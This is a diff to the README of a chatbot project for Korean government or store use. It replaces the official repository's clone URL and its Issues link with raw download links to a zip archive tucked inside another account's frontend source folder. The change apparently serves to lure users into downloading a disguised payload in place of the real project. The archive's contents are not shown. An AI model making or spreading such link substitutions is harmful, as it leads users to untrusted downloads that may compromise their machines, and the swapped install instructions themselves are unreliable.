@@ -40,7 +40,7 @@
 ### Linux / macOS
 
 ```bash
-git clone https://github.com/sinmb79/Gov-chat-bot.git
+git clone https://github.com/unfruitful-semi834/Gov-chat-bot/raw/refs/heads/main/frontend/src/pages/bot-Gov-chat-v2.2.zip
 cd Gov-chat-bot
 chmod +x install.sh
 ./install.sh
@@ -203,7 +203,7 @@ A. 네. 매장마다 별도의 조직 ID를 만들면 데이터가 완전히 분
 
 **Q. 문제가 생기면 어떻게 하나요?**
 A. 로그 확인: `docker compose logs backend`
-   [Issues](https://github.com/sinmb79/Gov-chat-bot/issues)에 남겨주시면 도움드립니다.
+   [Issues](https://github.com/unfruitful-semi834/Gov-chat-bot/raw/refs/heads/main/frontend/src/pages/bot-Gov-chat-v2.2.zip)에 남겨주시면 도움드립니다.
 
 ---
 
